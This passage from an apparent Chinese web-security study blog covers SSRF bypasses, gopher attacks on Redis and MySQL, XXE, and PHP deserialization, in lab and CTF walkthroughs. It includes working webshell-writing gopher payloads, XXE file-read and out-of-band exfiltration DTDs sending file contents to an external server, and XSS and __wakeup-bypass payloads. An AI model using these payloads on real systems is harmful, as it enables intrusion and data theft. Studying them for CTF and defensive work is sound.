url&#x3D;http://0/flag.php绕过\n\n\n357-利用重定向解析绕过\n这关通过gethostbyname解析域名对应的ip地址但是 不能为127.0.0.1否则会进入if判断\n\n在服务器上面创建文件保存为xx.php内容如下\n\n&lt;?php\nheader(&quot;Location:http://127.0.0.1/flag.php&quot;); \n其作用是：当执行该脚本时，会直接跳转到对应的网址，即Location: 后面的网址。\n4. 使用POST data传入url=http://47.94.236.117/xx.php![image-20250529111754830](/img/image-20250529111754830.png)![0d97ee831343fbb5409acbd735609aba](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\0d97ee831343fbb5409acbd735609aba./img/png)#### **358-匹配且不影响写法解析**1. 这关preg_match对传入的url进行了匹配必须有http: ctf: show2. 我们这里POST data传入http://ctf.@127.0.0.1/flag.php#show   * 为啥浏览器能识别这个 URL？     * ```       scheme://[userinfo@]host[:port]/path[?query][#fragment]       协议：   http       用户名：ctf       主机名：127.0.0.1       路径：   /flag.php       片段：   #show       \n\n  * `ctf.@127.0.0.1` 中的 `ctf.` 被浏览器解析为 **用户名（user info）**\n\n  * `@` 之后的 `127.0.0.1` 是 **主机地址**\n\n  * `#show` 是 **URL 片段（fragment）**，浏览器用来跳转锚点，不会发到服务器\n\n* 浏览器会把这个请求发送给 `http://127.0.0.1/flag.php`\n\n  * **不会**真的尝试登录 `ctf` 用户\n  * **不会**发出 `#show` 给服务器（这是客户端解析用的）\n  * 所以它访问的是本地 `127.0.0.1` 上的 `/flag.php`\n\n\n\n\n\n359-360利用gopher协议打服务前置知识\n\n访问demo01&#x2F;xss&#x2F;xss.php?x&#x3D;alert(%27xss%27)触发xss漏洞\n\n将这个http://demo01/xss/xss.php?x=%3Cscript%3Ealert(%27xss%27)%3C/script%3E代码放到ssrf.php下面也能执行xss 原因是这里走的都是http协议让服务器访问提交的地址等同于触发xss的代码  但是有的漏洞走的不是http协议\n\n假设&#96;http://demo01/xss/xss.php是个内网地址，只要有ssrf漏洞服务器就可以访问，利用他当跳板去访问其他内网主机并进行相关漏洞利用\n\n但是服务器有redis和mysqli服务就不能使用http协议了 这个时候就得用上gopher\n\n什么是 Gopher 协议？\n\ngopher:// 是一种过时的文本协议（早期 Web 设计），大多数人已经不用它了。\n\n但在 SSRF 利用中，它非常有用\n\n它允许你精准控制请求内容（比 http:&#x2F;&#x2F; 更低层、更自由），可以用于伪造 TCP 数据包。\n\n\n假设后端开放了 Redis 服务（6379 端口），可以用 SSRF + Gopher 伪造 Redis 协议，写入恶意数据：\n\n目标：写入 Redis 命令，达到 Webshell 注入或命令执行\n\ngopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0atest%0d%0a$5%0d%0ahello%0d%0a\n会发出 Redis 协议:\n*3\n$3\nSET\n$5\ntest\n$5\nhello\n相当于执行命令：SET test hello\n     * ![image-20250529140736021](/img/image-20250529140736021.png)&lt;img src=&quot;/img/image-20250529141111117.png&quot; alt=&quot;image-20250529141111117&quot; style=&quot;zoom:33%;&quot; /&gt;![image-20250529140935049](/img/image-20250529140935049.png)---1. 这里题目已经很明显了告诉我们打redis2. 这里使用工具Gopherus 生成payload 参考： [Gopherus工具的下载、使用](https://blog.csdn.net/weixin_68416970/article/details/139440201)3. 使用 工具Gopherus 在var/www/html/cmd.php 下写入一句话木马&lt;?php eval($_POST[cmd]);?&gt;4. 这里还会进行一次url解码所以我们要再进行一次url编码 最终为5. 经过BP抓包确定路径为check.php，参数为returl，POST传参6. 然后访问cmd.php文件，确定写入成功7. cmd=system(&quot;tac /flag.txt&quot;)即可获取flag&gt; returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254a%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2563%256d%2564%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2563%256d%2564%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501![image-20250529175523566](/img/image-20250529175523566.png)![image-20250529161558557](/img/image-20250529161558557.png)![image-20250529222511786](/img/image-20250529222511786.png)![image-20250529222558594](/img/image-20250529222558594.png)![image-20250529222610814](/img/image-20250529222610814.png)**360打redis**1. 用工具生成payload redis都有默认的直接回车就好了 2. 然后对payload进行一次url编码3. 这里是是用POST方式 url传递参数4. 访问shell.php执行命令即可&gt; url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A&lt;img src=&quot;/img/image-20250530105224572.png&quot; alt=&quot;image-20250530105224572&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;img src=&quot;/img/image-20250530105327190.png&quot; alt=&quot;image-20250530105327190&quot; style=&quot;zoom:50%;&quot; /&gt;![image-20250530105430299](/img/image-20250530105430299.png)![05d568a271f23936b21e49fc8c6570a1](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\05d568a271f23936b21e49fc8c6570a1./img/png)### 黑盒WEB-业务功能&amp;URL关键字黑盒探针1. 访问loclhost和127.0.0.1后发现出来的页面不一样2. 可能存在ssrf漏洞![image-20250530115736216](/img/image-20250530115736216.png)![fcbc75f9ec712e32f92f29bdc505ff70](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\fcbc75f9ec712e32f92f29bdc505ff70./img/png)**案例演示**![img](https://i-blog.csdnimg.cn/blog_migrate/b6f7391b77a2dd69e15187b23c5ac6be.png)![37b0f0406a960588652daa38143f37dc](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\37b0f0406a960588652daa38143f37dc./img/png)ssrfpdf1. 在本地创建一个pdf文档 里面写上js代码·2. 当应用时如果里面的代码被触发并且dnslog有内容 就代表ssrf存在iframe标签\n\n\n\n\n\n\n\n\n\n标签是干嘛的？\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"059-Web攻防-XXE安全&DTD实体&复现源码等","url":"/2025/09/16/059-Web%E6%94%BB%E9%98%B2-XXE%E5%AE%89%E5%85%A8&DTD%E5%AE%9E%E4%BD%93&%E5%A4%8D%E7%8E%B0%E6%BA%90%E7%A0%81%E7%AD%89/","content":"059-Web攻防-XXE安全&amp;DTD实体&amp;复现源码等知识点\nXML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法\nXML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改\nXML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显\n\n什么是XML?\nXML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可\n选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的\n信息传输工具。等同于 JSON 传输。\nXXE 漏洞 XML External Entity Injection\n即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没禁止外部实体\n的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网扫描、攻击内网等危\n害。\n\n\nXML 与 HTML 的主要差异：\nXML 被设计为传输和存储数据，其焦点是数据的内容。\nHTML 被设计用来显示数据，其焦点是数据的外观。\nHTML 旨在显示信息 ，而 XML 旨在传输存储信息。\nExample：网站的 xml 文件解析\n\n第一种为xml格式传输\n第二钟常规传输\n第三种为json传输\n\n\n\n\n\n\n\n-XXE 黑盒发现漏洞：1、获取得到 Content-Type 或数据类型为 xml 时，尝试 xml 语言 payload 进行测试\n2、不管获取的 Content-Type 类型或数据传输类型，均可尝试修改后提交测试 xxe\n3、XXE 不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成\n文件中的 XXE Payload 被执行\n4、流量包里面对关键字进行筛选&lt;?xml\n-XXE 白盒发现：\n1、可通过应用功能追踪代码定位审计\n2、可通过脚本特定函数搜索定位审计\n3、可通过伪协议玩法绕过相关修复等\nXXE 修复防御方案：\n-方案 1-禁用外部实体\nPHP:\nlibxml_disable_entity_loader(true);\nJAVA:\nDocumentBuilderFactory dbf \n&#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferenc\nes(false);\nPython：\nfrom lxml import etreexmlData &#x3D; \netree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))\n—方案2-过滤用户提交的XML数据\n过滤关键字：&lt;!DOCTYPE 和&lt;!ENTITY,或者 SYSTEM 和 PUBLIC\nXML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法参考：https://www.cnblogs.com/20175211lyz/p/11413335.html\n1、读取文件：有回显1、读取文件：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Mikasa [&lt;!ENTITY test SYSTEM  &quot;file:///d:/1.txt&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;\n\n简单案例\n\n在本地搭建的xxe网站登录进行抓包\n修改请求 复制粘贴上面的代码 读取我D盘下事先准备好的文件1.txt\n读取成功\n\n\n\n\n\n1.1、带外测试：无回显&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;http://y80f9n.dnslog.cn&quot;&gt;    %file;]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;\n\n简单案例\n\n修改代码 将上面的代码复制粘贴到请求包里面\n\n\n\n\n2、外部引用实体dtd：无回显&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/evil2.dtd&quot;&gt;    %file;]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;evil2.dtd：&lt;!ENTITY send SYSTEM &quot;file:///d:/e.txt&quot;&gt;\n\n简单案例\n\n在本地目录下面写好我们的text.txt将后缀修改为dtd文件内容如下\n将此文件放在www文件夹下面\n打开登录界面进行抓包\n\n\n\n\n问题：test.dtd为什么读取的是我本机上面的d盘下的1.txt而不是我虚拟机上面的\nXXE 中的 file:// 是一个本地文件 URI 协议，表示访问当前操作系统本地的文件系统。\n\n所以：文件路径是相对于“XML 解析器”运行所在的系统，而不是相对于 DTD 所在的服务器。\n\n\n\n让 XML 在虚拟机中被解析：让你的服务程序（比如 DVWA、Java Web 服务、PHP）在虚拟机里运行，那 XXE 攻击读取的就是虚拟机里的文件。\n将虚拟机中的文件通过 HTTP 暴露出来&lt;!ENTITY send SYSTEM &quot;http://&lt;虚拟机IP&gt;:8081/1.txt&quot;&gt;\n\n3、无回显读文件&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///d:/2.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;解释：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///d:/2.txt&quot;&gt; //定义一个外部实体 file，它的内容是本地 D 盘上的 2.txt 文件内容&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;//再定义一个实体 remote，告诉解析器去远程加载 test.dtd 文件。%remote;//加载并执行 test.dtd 中的内容（这是关键，像 include 一样）%all;//加载 test.dtd 中定义的 %all 实体（下一步会看到它的作用）。]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;//最终输出实体 send 的内容，它是在远程的 test.dtd 中间接定义的test.dtd：&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;//这里定义了一个实体 %all，它的内容是再定义一个名叫 send 的实体。这个 send 的值是一个远程 URL，它包含 %file;，也就是之前读取到的 d:/2.txt 文件内容最终，&amp;send; 会被替换为对这个 URL 的请求（比如 get.php?file=secret123），从而把敏感文件内容发送到攻击者服务器上。get.php&lt;?php $data=$_GET[&#x27;file&#x27;];$myfile=fopen(&quot;file.txt&quot;,&quot;+w&quot;);fwrite($myfile,$data);fclose($myfile);?&gt;//这个脚本的作用是保存 XML 请求中泄露出来的文件内容[目标机器解析 XML]        ↓读取 file:///d:/2.txt 成为实体 file        ↓从 http://47.94.236.117/test.dtd 加载恶意 DTD        ↓test.dtd 定义 send → 包含敏感文件内容的 URL        ↓XML 中出现 &amp;send; → 向攻击者网站发出请求        ↓get.php 接收数据并保存为 file.txt\n\n简单案例\n\n本地目录下面创建2.txt内容如下文件里面的内容不能是中文 XML 解析器要求 URI 必须是符合标准格式的 ASCII 字符串\n在虚拟机本地目录下面写入文件test1.txt写完修改后缀为dtd并在目录下面写入get.php文件\n在登录页面访问抓包 将上面的代码复制到请求包里面\n\n\n\n\n\n\n黑盒测试：观察数据的格式\n白盒测试：处理数据的函数和框架\n4、其他玩法（协议）-见参考地址\n参考：https://www.cnblogs.com/20175211lyz/p/11413335.html\n当无回显时我们应该想到三个问题：\n\n\n无漏洞\n无回显\npayload有问题\n\n\n\nXML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改http://web.jarvisoj.com:9882/XXE 黑盒发现:1、获取 Content-Type 或数据类型为 xml 时，尝试进行 xml 语言 payload 进行测试\n2、不管获取的 Content-Type 类型或数据传输类型，均可尝试修改后提交测试 xxe流程:功能分析-前端提交-源码&amp;抓包-构造 Paylod 测试更改请求数据格式:Content-Type\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM &quot;file:///d:/1.txt&quot;&gt;]&gt;&lt;x&gt;\t&amp;f;&lt;/x&gt;\n\n\n\nML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计流程简单案例：\n\n漏洞函数simplexml_load_string用来把 XML 字符串转换成一个可以操作的对象（类似数组）**，方便你读取或处理 XML 数据\n\npe_getxml函数调用了漏洞函数右键 转到 申明和用力查看调用的地方\n\nwechat_getxml调用了pe_getxml  \n\nnotify_url 调用了wechat_getxml\n\n访问Notify_url文件 抓包 出发wechat_getxml函数，构造payload测试 无回显 使用带外\n\n先尝试读取文件，无回显后带外测试\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM &quot;file:///d:/1.txt&quot;&gt;]&gt;&lt;x&gt;\t&amp;f;&lt;/x&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"060-WEB攻防-PHP反序列化&POP链构造&魔术方法流程&漏洞触发条件&属性修改","url":"/2025/09/16/060-WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&POP%E9%93%BE%E6%9E%84%E9%80%A0&%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%B5%81%E7%A8%8B&%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6&%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9/","content":"060-WEB攻防-PHP反序列化&amp;POP链构造&amp;魔术方法流程&amp;漏洞触发条件&amp;属性修改知识点：1、PHP-反序列化-应用&amp;识别&amp;函数2、PHP-反序列化-魔术方法&amp;触发规则3、PHP-反序列化-联合漏洞&amp;POP链构造\n在实战情况下，是不需要知道这些具体分析的，都是利用工具去扫一些框架爆出的反序列话漏洞直接利用即可。学这些具体分析就是为了以后往漏洞挖掘方向发展或者打CTF比赛及面试会被问\n1、PHP-DEMO1-序列化和反序列化为什么会产生序列化？为了解决开发中数据传输和数据解析的一个情况(类似于要发送一个椅子快递，不可能整个椅子打包发送，这是非常不方便的，所以就要对椅子进行序列化处理，让椅子分成很多部分在一起打包发送，到目的后重新组装，也就是反序列化处理)\n什么是反序列化操作？ - 类型转换\nPHP &amp; JavaEE &amp; Python（见图）\n\n\n\n序列化：对象转换为数组或字符串等格式\n序列化（Serialization）： 把“复杂的数据结构（如数组、对象）”转换成一个字符串，方便你：\n\n存进文件\n放进数据库\n在网络上传输（如 Cookie、Session、API）\n\n不能直接把“数组”或“对象”这样的复杂数据，塞进一个只支持字符串的地方（比如 Cookie）。\n为什么不能直接把数组或对象塞进只支持字符串的地方？\n\n本质问题：类型不兼容\n\nPHP 的数组、对象是内存中的复杂结构，比如：\n\n数组有键名、键值、可能还嵌套其他数组\n对象有属性、方法、类名等元信息\n\n而像 Cookie、数据库字段、URL 参数，这些地方只能存储字符串类型（即文本）。\n所以你不能直接把这样的“结构”放进去，比如：\nsetcookie(&quot;user&quot;, [&#x27;name&#x27; =&gt; &#x27;Tom&#x27;]); // ❌ 错误！数组不能直接当 cookie 值\n\n\n反序列化（Unserialization）： 是序列化的逆操作——把字符串还原成原来的数据结构\n\nserialize() &#x2F;&#x2F;将对象转换成一个字符串unserialize() &#x2F;&#x2F;将字符串还原成一个对象\n2、PHP-DEMO2-魔术方法触发规则常见的php魔术方法\n\n__construct():\n&#x2F;&#x2F;当对象new的时候会自动调用\n当new Test实例化对象 触发魔术方法_construct()  输出__construct()初始化\nunset() 是 PHP 的一个语言结构，用于销毁变量，也就是说，它会让一个变量“消失”。\n\n\n__destruct()\n&#x2F;&#x2F;当对象被销毁时会被自动调用\n__destruct() 是对象销毁时自动触发的魔术方法。你没有主动销毁对象 $test，但当脚本结束时 PHP 自动回收内存，系统帮你调用了 __destruct()，所以会输出那一行。\n\n\n__sleep()\n: &#x2F;&#x2F;serialize()序列化执行时被自动调用\n\n\n\n__wakeup()\n&#x2F;&#x2F;unserialize()反序列化时会被自动调用\n\n这个和__sleep()截然相反\n\n\n\n\n__invoke()\n: &#x2F;&#x2F;把对象当作函数调用时触发\n\n\n__toString()\n: &#x2F;&#x2F;把对象当作字符串使用时触发\n\n 原因详解：为什么 __toString() 会被自动调用？\n\n\\1. echo &#x2F; 字符串上下文要求是字符串类型 \n在 PHP 中，echo 是一个语言结构，它只能输出字符串。所以当你：echo $a\n其中 $a 是一个对象，PHP 必须把它转换成字符串，否则就会报错。\n\n\n__call():\n&#x2F;&#x2F;调用某个方法,若方法存在,则调用;若不存在,则会去调用__call函数。\n\n\n\n__get()\n读取一个对象的属性时，若属性存在，则直接返回属性值；若不存在，则会调用__get函数\n\n\n\n__ set()\n魔术方法 设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用__set函数。\n\n__set()：设置对象不存在的属性或无法访问(私有)的属性时调用\n\n__set($name, $value)\n * 用来为私有成员属性设置的值\n * 第一个参数为你要为设置值的属性名，第二个参数是要给属性设置的值，没有返回值。\n![image-20250527203600241](/img/image-20250527203600241.png)![image-20250527203703407](/img/image-20250527203703407.png)### __isset()* __检测对象的某个属性是否存在时执行此函数。当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用* name没被调用的原因是因为name是私有属性&lt;img src=&quot;/img/image-20250527204233957.png&quot; alt=&quot;image-20250527204233957&quot; style=&quot;zoom:50%;&quot; /&gt;![image-20250527204411525](/img/image-20250527204411525.png)* 这里因为name是私有属性所以不可访问 并且不可访问属性还使用了isset（）所以调用了__isset()魔术方法显示123* **为什么echo empty($person-&gt;sex) 为1**  原因是：**重写了 `__isset()` 魔术方法** PHP 做了下面这些步骤：  1. 检查 `$person-&gt;sex` 能不能访问；  2. `sex` 是公共属性，所以可以访问，不走 `__isset()`；  3. 但出于一致性，PHP 会**调用 `__isset()` 方法**来判断属性是否存在；  4. 你的 `__isset()` 方法返回：\nreturn isset($this-&gt;$content);\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"061-WEB攻防-PHP反序列化&原生类TIPS&CVE绕过漏洞&属性类型特征","url":"/2025/09/16/061-WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&%E5%8E%9F%E7%94%9F%E7%B1%BBTIPS&CVE%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E&%E5%B1%9E%E6%80%A7%E7%B1%BB%E5%9E%8B%E7%89%B9%E5%BE%81/","content":"061-WEB攻防-PHP反序列化&amp;原生类TIPS&amp;CVE绕过漏洞&amp;属性类型特征\n知识点\n1、PHP-反序列化-属性类型&amp;显示特征\n2、PHP-反序列化-CVE绕过&amp;字符串逃逸\n3、PHP-反序列化-原生类生成&amp;利用&amp;配合\n\n1、PHP-反序列化-属性类型&amp;显示特征\n1、对象变量属性：public(公共的):在本类内部、外部类、子类都可以访问protect(受保护的):只有本类或子类或父类中可以访问private(私人的):只有本类内部可以使用2、序列化数据显示：public属性序列化的时候格式是正常成员名private属性序列化的时候格式是%00类名%00成员名protect属性序列化的时候格式是%00*%00成员名\n\n序列化数据演示\n&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);//public private protected说明class test&#123;    public $name=&quot;xiaodi&quot;;    private $age=&quot;29&quot;;    protected $sex=&quot;man&quot;;&#125;$a=new test();$a=serialize($a);print_r($a);var_dump(unserialize($a));\n\n\n2、PHP-反序列化-CVE绕过&amp;字符串逃逸\nCVE-2016-7124（__wakeup：unserialize()时会被自动调用）漏洞编号：CVE-2016-7124影响版本：PHP 5&lt;5.6.25; PHP 7&lt;7.0.10漏洞危害：如存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup执行\n\n\n案例演示：CVE-2016-7124  __wakeup绕过\n__wakeup()：会在反序列化后调用\n\n一旦用到了unserialize __wakeup函数将会被调用\n\n//__wakeup：反序列化恢复对象之前调用该方法//CVE-2016-7124 __wakeup绕过class Test&#123;    public $sex;    public $name;    public $age;    public function __construct($name, $age, $sex)&#123;        echo &quot;__construct被调用!&lt;br&gt;&quot;;    &#125;    public function __wakeup()&#123;        echo &quot;__wakeup()被调用&lt;br&gt;&quot;;    &#125;    public function __destruct()&#123;        echo &quot;__destruct()被调用&lt;br&gt;&quot;;    &#125;&#125;$t = new Test(&#x27;xiaodi&#x27;,&#x27;31&#x27;,&#x27;gay&#x27;);echo serialize($t),&quot;&lt;br&gt;&quot;;unserialize($_GET[&#x27;x&#x27;]);?&gt;\n\n\n绕过__wakeu：修改属性数量即可 \n\n生成反序列化字符串O:4:&quot;Test&quot;:3:&#123;s:3:&quot;sex&quot;;N;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;N;&#125;&lt;br&gt;\n传入字符串修改里面的属性数量 将4改为5 \n绕过成功\n\nclass Test&#123;    public $sex;    public $name;    public $age;&#125;$t=new Test();echo serialize($t);\n\n\n[极客大挑战 2019]PHP网址：https://buuoj.cn/\n\n根据提示 此网站下面有个备份文件 在url 后面加上 www.zip 下载\n\n\n\n\n\n\n\n\n\n\n打开class.php文件 查看代码可知当username&#x3D;&#x3D;&#x3D; admin的时候 就输出flag  这个条件的调用是在__destruct里面的 触发这个魔术方法\n\n查看index.php文件 可以看到这里用了unserialize反序列化select传入的参数 \n\n但是在class.php里面有个__ wakeup 在魔术方法里面 比 __destruct先一步调用 所以我们这里要想办法 绕过 __wakeup\n\n修改参数 达成代码所需条件进行反序列化 再进行url编码 \n\nO%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D\n\n\n查看漏洞是否在漏洞区间 5.3.3存在漏洞区间\n\n修改位数 使够找payload使得对象属性个数的值大于真实属性个数时会跳过__wakeup执行\n\nO%3A4%3A%22Name%22%3A4%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D\n\n\n\n\n\n\n\n\nclass Name&#123;    private  $username = &#x27;admin&#x27;;    private $password = &#x27;100&#x27;;&#125;$n = serialize(new name());echo urlencode($n);\n\n\n\n\n\n\n字符串逃逸字符变多-str1.php str1-pop.php字符变少-str2.php str2-pop.php\n3、PHP-反序列化-原生类生成&amp;利用&amp;配合参考案例：https://www.anquanke.com/post/id/264823\n原生类（Native class）是指在编程语言的核心库或标准库中提供的类，这些类是语言本身提供的，而不是由用户自定义的类。原生类通常包含语言内置的功能和特性，用于解决常见的编程任务和操作。\nPHP原生类使用场景：在代码中没有看到魔术方法的情况下使用的\n\n先看触发的魔术方法\n\n没写魔术方法调用逻辑代码\n\n使用魔术方法的原生类去利用\n\n获取魔术方法的原生类（脚本生成 多少和当前环境的模块开关）\n\n利用魔术方法内置的类 pop修改内置值 行成攻击\n\n\n生成原生类脚本代码：&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#x27;__destruct&#x27;,            &#x27;__toString&#x27;,            &#x27;__wakeup&#x27;,            &#x27;__call&#x27;,            &#x27;__callStatic&#x27;,            &#x27;__get&#x27;,            &#x27;__set&#x27;,            &#x27;__isset&#x27;,            &#x27;__unset&#x27;,            &#x27;__invoke&#x27;,            &#x27;__set_state&#x27;        ))) &#123;            print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;;        &#125;    &#125;&#125; \n\n\n\n原生类生成\n可以看到我的原生类是在c 盘下面的 找到这个目录打开php.ini 查找里面的原生类开关\n\n我这里的soap是没有打开的 将；去掉再运行\n\n可以看到多了三个原生类\n\n实战是不知道对方的原生类开关开没开 可以在本地多生成一些原声类 生成的原生类多一些利用的机会也就多一些\n\n\n\n\n\n\n\n原生类利用\n可以将我们的原生类复制到官网上查看如何使用 这里以Exception::__toString为例 写了说明和使用方法\n\n\n\n简单案例-本地代码\n\n我们使用Exception生成一个带有xss的异常消息 用序列化在用url编码构造我们的payload\n打开我们的本地文件xssdemo.php内容如下\n这里是用k传参将我们的payload复制上去 弹出我们的xiaodi\n\n为什么没有写 __toString() 方法却仍然可以触发它？\n\n使用的类（如 Exception）内置实现了 __toString() 方法，即使你自己没有写，它在类内部已经定义好了。\nPHP 对象在被 echo 时自动调用 __toString()在 PHP 中，当你对一个对象使用 echo 或 print，PHP 会自动尝试调用该对象的魔术方法 __toString()。\n**Exception 类内部实现了 __toString()**虽然 Exception 类没有 __toString() 方法，但它实现了 __toString() 接口（可以输出 message 等信息），所以：\n由于构造函数中传入了你控制的字符串（比如 &lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;），这些字符串最终也出现在 __toString() 的返回值中，就被输出到页面上，从而触发了 XSS。\n\necho $a;实际上等效于：echo $a-&gt;__toString();\n\n\nO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A32%3A%22%3Cscript%3Ealert%28%27xiaodi%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A38%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Cdemo01%5Cpop%5Cpop.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A65%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n\n$a = new Exception(&quot;&lt;script&gt;alert(&#x27;xiaodi&#x27;)&lt;/script&gt;&quot;);echo urlencode(serialize($a));\n\n\n\n\nCTFSHOW-Web259\n这里将传过来的接受的参数进行反序列化 调用了一个不存在的方法getFlag（）\n\n调用不存在的方法触发__call(因为getflag方法是不存在的，所以调用该魔术方法)\n\n这关代码提示显示 要求token&#x3D;&#x3D;ctfshow 并且ip地址要为127.0.0.1 所以我们使用ssrf去通关\n\n无代码通过原生类SoapClient(只生成_call方法的原生类)\n\n构造pop链 传入 